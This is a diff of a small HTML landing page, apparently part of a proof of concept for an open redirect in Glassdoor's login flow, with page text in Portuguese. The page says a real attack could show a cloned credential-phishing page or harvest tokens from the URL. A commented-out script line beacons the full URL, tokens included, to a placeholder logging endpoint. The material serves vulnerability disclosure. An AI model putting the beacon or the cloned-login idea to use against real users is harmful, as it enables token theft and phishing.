@@ -1,4 +1,18 @@
 <!doctype html>
-<title>after-login</title>
-<h2>Você voltou para o domínio externo (PoC) após o login!</h2>
-<p>Se isso fosse ataque real, aqui estaria o clone malicioso.</p>
+<meta charset="utf-8">
+<title>After Login – Attacker Landing</title>
+<body>
+<h2>✅ Você foi redirecionado para o domínio externo (PoC)</h2>
+<p>
+Se isto fosse um ataque real, aqui poderia haver uma página clonada do Glassdoor solicitando credenciais novamente
+ou algum script coletando dados/tokens presentes na URL.
+</p>
+<p>
+Carimbo de tempo: <span id="ts"></span>
+</p>
+<script>
+  document.getElementById('ts').textContent = new Date().toISOString();
+  // opcional: enviar um beacon ao seu servidor para provar a visita
+  // navigator.sendBeacon('https://seu-endpoint-de-logs.example/seen', new Blob([location.href]));
+</script>
+</body>
